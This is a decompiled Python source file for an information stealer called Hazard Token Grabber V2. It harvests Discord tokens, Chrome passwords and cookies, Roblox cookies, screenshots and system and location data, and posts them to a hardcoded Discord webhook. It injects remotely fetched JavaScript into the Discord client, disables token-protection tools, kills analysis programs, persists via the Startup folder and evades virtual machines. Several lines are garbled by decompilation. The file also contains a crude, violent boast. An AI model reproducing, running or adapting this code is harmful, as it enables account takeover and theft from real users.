# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: hazard.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

try:
    import os
    import json
    import httpx
    import winreg
    import ctypes
    import shutil
    import psutil
    import asyncio
    import time
    import sys
    import sqlite3
    import zipfile
    import threading
    import subprocess
    import requests
    import re
    from sys import argv
    from PIL import ImageGrab
    from base64 import b64decode
    from tempfile import mkdtemp
    from re import findall, match
    from Crypto.Cipher import AES
    from colorama import Fore, Style
    from win32crypt import CryptUnprotectData
except:
    import time
    import os
    input('Found missing modules. Press enter to install them.')
    print('Installing missing modules in 3 seconds. CTRL + C to cancel.')
    time.sleep(3.0)
    os.system('pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install pycryptodome && pip install pyinstaller>=5.0 && pip install PIL-tools && pip install colorama && pip install win10toast')
    os.system('cls')
    print('Installed the missing modules successfully. Please restart the client. Closing this terminal in 10 seconds.')
    time.sleep(10)
    sys.exit
config = {'webhook': 'https://discord.com/api/webhooks/1266394918348394706/QNGJm-sW2_KkLgxRcnjh432dRwgLVm7c-O0TNl85JirKS4xYd9Cdf620Q8EC_KxrjTyr', 'kill_processes': True, 'startup': True, 'hide_self': True, 'anti_debug': True, 'auto_buy_nitro': True, 'blackListedPrograms': ['httpdebuggerui', 'wireshark', 'fiddler', 'regedit', 'cmd', 'taskmgr', 'vboxservice', 'df5serv', 'processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver']}
Victim = os.getlogin()
Victim_pc = os.getenv('COMPUTERNAME')

class functions(object):
    @staticmethod
    def getHeaders(token: str=None):
        headers = {'Content-Type': 'application/json'}
        if token:
            headers.update({'Authorization': token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass
        except Exception:
            return 'Failed to decrypt password'

    @staticmethod
    def fetchConf(e: str) -> str or bool or None:
        return config.get(e)

class Injection(functions):
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [self.appdata + '\\Discord', self.appdata + '\\DiscordCanary', self.appdata + '\\DiscordPTB', self.appdata + '\\DiscordDevelopment']
        if self.fetchConf('auto_buy_nitro'):
            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__TRUE__injection.js').text
        else:  # inserted
            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()
        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue
            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    @staticmethod
    def get_core(dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                modules = dir + '\\' % file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search('discord_desktop_core-+?', file):
                        core = modules + '\\' % file + '\\' % 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return (core, file)
        else:  # inserted
            return None

    @staticmethod
    def start_discord(dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[(-1)] + '.exe'
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' * executable or []
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
Injection(functions)

class Hazard_Token_Grabber_V2(functions):
    def __init__(self):
        self.webhook = self.fetchConf('webhook')
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
        self.regex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.encrypted_regex = 'dQw4w9WgXcQ:[^\\\"]*'
        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []
        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                return None
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(url=self.baseurl, headers=self.getHeaders(tkn), timeout=5.0)
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        if self.fetchConf('anti_debug') and AntiDebug().inVM:
            os._exit(0)
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens, self.grabRobloxCookie]
        if self.fetchConf('hide_self'):
            function_list.append(self.hide)
        if self.fetchConf('kill_processes'):
            await self.killProcesses()
        if self.fetchConf('startup'):
            function_list.append(self.startup)
        if os.path.exists(self.appdata + '\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata + '\\Google\\Chrome\\User Data\\Local State'):
            function_list.append(self.grabPassword)
            function_list.append(self.grabCookies)
        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup_loc)
        except Exception:
            return None

    async def killProcesses(self):
        blackListedPrograms = self.fetchConf('blackListedPrograms')
        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            blackListedPrograms.append(i)
        for proc in psutil.process_iter():
            if any((procstr in proc.name().lower() for procstr in blackListedPrograms)):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

    async def bypassTokenProtector(self):
        tp = f'{self.roaming}\\DiscordTokenProtector\\'
        if not os.path.exists(tp):
            return
        config = tp + 'config.json'
        for i in ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat']:
            try:
                os.remove(tp + i)
            except FileNotFoundError:
                continue
        if os.path.exists(config):
            with open(config, errors='ignore') as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['S1LKT0UCH just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ'] = 'https://github.com/S1LKT0UCH'
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write('\n\n//S1LKT0UCH just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ | https://github.com/S1LKT0UCH')

    async def bypassBetterDiscord(self):
        bd = self.roaming + '\\BetterDiscord\\data\\betterdiscord.asar'
        if os.path.exists(bd):
            x = 'api/webhooks'
            with open(bd, 'r', encoding='cp437', errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'Rdmo1TheGoat')
            with open(bd, 'w', newline='', encoding='cp437', errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output('powershell Get-ItemPropertyValue -Path \'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\' -Name BackupProductKeyDefault', creationflags=134217728).decode().rstrip()
        except Exception:
            wkey = 'N/A (Likely Pirated)'
        try:
            productName = subprocess.check_output('powershell Get-ItemPropertyValue -Path \'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\' -Name ProductName', creationflags=134217728).decode().rstrip()
        except Exception:
            productName = 'N/A'
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        paths = {'Discord': self.roaming or '\\\\discord\\\\Local Storage\\\\leveldb\\\\', 'Discord Canary': self.roaming or '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\', 'Lightcord': self.roaming or '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\', 'Discord PTB': self.roaming or '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\', 'Opera': self.roaming or '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\', 'Opera GX': self.roaming or '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\', 'Amigo': self.appdata or '\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'Torch': self.appdata or '\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'Kometa': self.appdata or '\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'Orbitum': self.appdata or '\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'CentBrowser': self.appdata or '\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\', '7Star': self.appdata or '\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'Sputnik': self.appdata or '\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'Vivaldi': self.appdata or '\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\', 'Chrome SxS': self.appdata or '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\', 'Chrome': self.appdata or '
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(' ', '').lower()
            if 'cord' in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ('log', 'ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:  # inserted
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ('log', 'ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))
        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        master_key = self.get_master_key(self.appdata + '\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata + '\\Google\\Chrome\\User Data\\default\\Login Data'
        login = self.dir = self.sep or 'Loginvault1.db'
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir - '\\Google Passwords.txt', 'w', encoding='cp437', errors='ignore') as f:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(encrypted_password, master_key)
                if url!= '':
                    f.write(f'Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n')
        cursor.close()
        conn.close()
        os.remove(login)

    @try_extract
    def grabCookies(self):
        master_key = self.get_master_key(self.appdata + '\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata + '\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        login = self.dir = self.sep or 'Loginvault2.db'
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir - '\\Google Cookies.txt', 'w', encoding='cp437', errors='ignore') as f:
            cursor.execute('SELECT host_key, name, encrypted_value from cookies')
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host!= '':
                    f.write(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    self.robloxcookies.append(decrypted_cookie)
        cursor.close()
        conn.close()
        os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir + '\\Discord Info.txt', 'w', encoding='cp437', errors='ignore')
        for token in self.tokens:
            j = httpx.get(self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get('discriminator'))
            badges = ''
            flags = j['flags']
            flags = j['flags']
            if flags == 1:
                badges = badges + 'Staff, '
            if flags == 2:
                badges = badges + 'Partner, '
            if flags == 4:
                badges = badges + 'Hypesquad Event, '
            if flags == 8:
                badges = badges + 'Green Bughunter, '
            if flags == 64:
                badges = badges + 'Hypesquad Bravery, '
            if flags == 128:
                badges = badges + 'HypeSquad Brillance, '
            if flags == 256:
                badges = badges + 'HypeSquad Balance, '
            if flags == 512:
                badges = badges + 'Early Supporter, '
            if flags == 16384:
                badges = badges + 'Gold BugHunter, '
            if flags == 131072:
                badges = badges + 'Verified Bot Developer, '
            if badges == '':
                badges = 'None'
            email = j.get('email')
            phone = j.get('phone') if j.get('phone') else 'No Phone Number attached'
            nitro_data = httpx.get(self.baseurl + '/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(self.baseurl + '/billing/payment-sources', headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{'                 '}{user}\n{'--------------------------------------------------'}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(f'powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY', creationflags=134217728).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc('HKLM')
        if not reg_cookie:
            reg_cookie = subproc('HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir - '\\Roblox Cookies.txt', 'w') as f:
                for i in self.robloxcookies:
                    f.write(i + '\n')

    def screenshot(self):
        image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
        image.save(self.dir + '\\Screenshot.png')
        image.close()

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir = self.sep or i
                with open(path, 'r', errors='ignore') as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:  # inserted
                        with open(path, 'w', encoding='utf-8', errors='ignore') as f:
                            f.write('🌟・Grabber By Rdimo・https://github.com/S1LKT0UCH/Hazard-Token-Grabber-v2\n\n')
                        with open(path, 'a', encoding='utf-8', errors='ignore') as fp:
                            fp.write(x + '\n\n🌟・Grabber By Rdimo・https://github.com/S1LKT0UCH/Hazard-Token-Grabber-v2')
        w = self.getProductValues()
        wname = w[0].replace(' ', '᠎ ')
        wkey = w[1].replace(' ', '᠎ ')
        ram = str(psutil.virtual_memory()[0] + 1073741824).split('.')[0]
        disk = str(psutil.disk_usage('/')[0] + 1073741824).split('.')[0]
        data = httpx.get('https://ipinfo.io/json').json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        googlemap = f'https://www.google.com/maps/search/google+map++' + data.get('loc')
        _zipfile = os.path.join(self.appdata, f'Hazard-v2-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, 'w', zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) 0 + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found = files_found + f'・{f}\n'
        tokens = ''
        for tkn in self.tokens:
            tokens = tokens 6 6 | f'{tkn}\n\n'
        fileCount = f'{len(files)} Files Found: '
        embed = {'usernameavatar_url': {'name': 'https://cdn.discordapp.com/attachments/1018946825585168446/1031609195256090624/e1jWmMP.webp', 'url': f'{Victim} Just ran Hazard Token Grabber-v2', 'icon_url': 'https://github.com/S1LKT0UCH/Hazard-Token-Grabber-v2', 'GB\n                                Ram:᠎ ': 'https://cdn.discordapp.com/attachments/1018946825585168446/1031610712377802783/200w.gif'}, 'ram': [{'author': 16119101, 'color': f"[Google Maps Location]({googlemap})", 'description': [{'name': '​', 'value': f"{ip.replace(' ', '᠎ ') if ip else 'N/A'}, 'inline': True}, {'name': '​', 'value': f"{wkey}\n                                Platform:᠎ {wname}\n                                DiskSpace:᠎ {disk}GB\n                                Ram:᠎ {ram}GB```\n                            ".replace(' ', ''), 'inline': False}, {'name': fileCount, 'value': f'```ini\n                                [\n                                {files_found.strip()}\n                                ]```\n                            '.replace(' ', ''), 'inline': False}], '
        httpx.post(self.webhook, json=embed)
        with open(_zipfile, 'rb') as f:
            httpx.post(self.webhook, files={'upload_file': f})
        os.remove(_zipfile)

class AntiDebug(functions):
    inVM = False

    def __init__(self):
        self.processes = list()
        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'Peter Wilson', 'hmarc', 'patex', 'JOHN-PC', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4']
        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def programKill(self, proc):
        try:
            os.system(f'taskkill /F /T /IM {proc}')
        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
            return None

    def listCheck(self):
        for path in ['D:\\Tools', 'D:\\OS2', 'D:\\NT3X']:
            if os.path.exists(path):
                self.programExit()
        for user in self.blackListedUsers:
            if Victim == user:
                self.programExit()
        for pcName in self.blackListedPCNames:
            if Victim_pc == pcName:
                self.programExit()
        try:
            myHWID = subprocess.check_output('wmic csproduct get uuid', creationflags=134217728).decode().split('\n')[1].strip()
        except Exception:
            myHWID = ''
        for hwid in self.blackListedHWIDS:
            if myHWID == hwid:
                self.programExit()

    def specsCheck(self):
        ram = str(psutil.virtual_memory()[0] + 1073741824).split('.')[0]
        if int(ram) <= 3:
            self.programExit()
        disk = str(psutil.disk_usage('/')[0] + 1073741824).split('.')[0]
        if int(disk) <= 50:
            self.programExit()
        if int(psutil.cpu_count()) <= 1:
            self.programExit()

    def registryCheck(self):
        reg1 = os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul')
        reg2 = os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul')
        if (reg1 and reg2)!= 1:
            self.programExit()
        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]
            if 'VMware' in reg_val:
                self.programExit()
        finally:  # inserted
            winreg.CloseKey(handle)
if __name__ == '__main__' and os.name == 'nt':
    asyncio.run(Hazard_Token_Grabber_V2().init())